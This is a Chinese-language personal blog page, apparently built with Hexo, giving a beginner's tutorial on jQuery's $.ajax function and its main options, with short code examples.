<h4 id="AJAX-Asynchronous-JavaScript-and-XML（异步的-JavaScript-和-XML）。"><a href="#AJAX-Asynchronous-JavaScript-and-XML（异步的-JavaScript-和-XML）。" class="headerlink" title="AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。"></a>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</h4><h4 id="AJAX-不是新的编程语言，而是一种使用现有标准的新方法。"><a href="#AJAX-不是新的编程语言，而是一种使用现有标准的新方法。" class="headerlink" title="AJAX 不是新的编程语言，而是一种使用现有标准的新方法。"></a>AJAX 不是新的编程语言，而是一种使用现有标准的新方法。</h4><h4 id="AJAX-是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。"><a href="#AJAX-是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。" class="headerlink" title="AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。"></a>AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。</h4><p>重点就在于异步请求，也就是在不刷新页面的情况下通过写请求与服务器通信动态更新页面的状态。<br>然后ajax可以自己写XMLHTTPRequest请求也可以直接使用jquery封装好的函数，<br>像我这种渣渣一般就直接用jq包了…..<br>所以下面我也是介绍jq的ajax用法而不是原生的ajax，如果有机会我再补上一篇原生的吧。</p>
<h3 id="构造一个ajax函数"><a href="#构造一个ajax函数" class="headerlink" title="构造一个ajax函数"></a>构造一个ajax函数</h3><p>不考虑别的东西我们先看看一个最简单的ajax函数是怎么样的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">     type:<span class="string">"POST"</span>,</span><br><span class="line">     url:<span class="string">"askforajax.php"</span>,</span><br><span class="line">     data:&#123;username:<span class="string">"John"</span>,age:<span class="string">"11"</span>&#125;,</span><br><span class="line">     dataType:<span class="string">"json"</span>,</span><br><span class="line">     success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span><br><span class="line">     </span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">     &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这就是一个ajax的基本构造了<br><code>type</code> 说明请求时是以何种方式，有GET和POST两种，区别跟表单提交一样<br><code>url</code> 请求的地址，一般的ajax只支持同域的地址，不支持跨域，跨域请参考jsonp，<br><code>data</code> 请求时传输的数据，基本格式就是{key:value}的形式，数组为{key:[value1,value2]}。<br><code>dataType</code> 预期返回数据类型，可以不设置，浏览器会自动识别处理为字符串，参数为以下<br>xml：返回XML文档，可用JQuery处理。<br>html：返回纯文本HTML信息；包含的script标签会在插入DOM时执行。<br>script：返回纯文本JavaScript代码。不会自动缓存结果。除非设置了cache参数。注意在远程请求时<br>（不在同一个域下），所有post请求都将转为get请求。<br>json：返回JSON数据。<br>jsonp：JSONP格式。使用JSONP形式调用函数时，例如myurl?callback=?，JQuery将自动替换后一个“?”<br>为正确的函数名，以执行回调函数。<br>text：返回纯文本字符串。<br><code>success</code> 请求成功后调用的函数，参数result是返回的数据，可用于返回处理，一般是以字符串<br>的形式返回，但是假如对方传的是json字符串，有两种处理，一种是显式用JSON.parse()来转换类型<br>另一种是设置 <code>dataType</code> 为json，就会自动把result转换为json对象。</p>
<p>基本上这就可以进行ajax请求了。当然在请求前一定要保证被请求的脚本做好了返回的工作，很多时候<br>没有请求成功都是返回结果出问题了，多用调试窗口看看就好了。</p>
<h3 id="更多的属性"><a href="#更多的属性" class="headerlink" title="更多的属性"></a>更多的属性</h3><p><code>timeout</code> 设置请求超时时间<br><code>async</code> true就是异步，false是同步，默认是异步，也就是两个ajax之间没有联系，根据实际情况<br>来选择，比如我之前做过下拉加载更多的ajax请求，假如设置为异步，那么可能会发生用户在返回前下拉<br>两次导致请求了两次相同的内容，所以要设置为同步来阻止。<br><code>cache</code> 默认为true（当dataType为script时，默认为false），设置为false将不会从浏览器缓存中加载<br>请求信息。<br><code>beforeSend</code> 接function，发送请求前可以修改XMLHttpRequest对象的函数，例如添加自定义HTTP头。<br>在beforeSend中如果返回false可以取消本次ajax请求。XMLHttpRequest对象是惟一的参数。<br>例如：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beforeSend: <span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest</span>)</span>&#123;</span><br><span class="line">     <span class="keyword">this</span>;   <span class="comment">//调用本次ajax请求时传递的options参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>complete</code> 请求完成后调用的函数，不管失败还是成功，success就只是成功才调用，<br>参数：XMLHttpRequest对象和一个描述成功请求类型的字符串。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest, textStatus</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>;    <span class="comment">//调用本次ajax请求时传递的options参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>error</code> 请求失败时执行的函数，该函数有3个参数，即XMLHttpRequest对象、错误信息、<br>捕获的错误对象(可选)。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest, textStatus, errorThrown</span>)</span>&#123;</span><br><span class="line">          <span class="comment">//通常情况下textStatus和errorThrown只有其中一个包含信息</span></span><br><span class="line">          <span class="keyword">this</span>;   <span class="comment">//调用本次ajax请求时传递的options参数</span></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure></p>
<p>还有一些别的因为不太常用就先不介绍了。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/js/">js</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/js/">js</a><a href="/tags/ajax/">ajax</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="github-card">
<p class="asidetitle">Github 名片</p>
<div class="github-card" data-github="https://github.com/lianMo" data-width="220" data-height="119" data-theme="medium">
<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
</div>
  </div>



  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/js/" title="js">js<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/教程/" title="教程">教程<sup>1</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/js/" title="js">js<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/ajax/" title="ajax">ajax<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/网站安全/" title="网站安全">网站安全<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/跨域/" title="跨域">跨域<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/hexo/" title="hexo">hexo<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Github/" title="Github">Github<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/网络/" title="网络">网络<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/面试/" title="面试">面试<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  <div class="weiboshow">
  <p class="asidetitle">新浪微博</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=undefined&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> A student learning more .... <br/>
			Nothing is impossible.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/3904284832" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		<a href="https://github.com/https://github.com/lianMo" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
		
		<a href="/about" target="_blank" title="lianMo">lianMo</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>










<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
 </html>
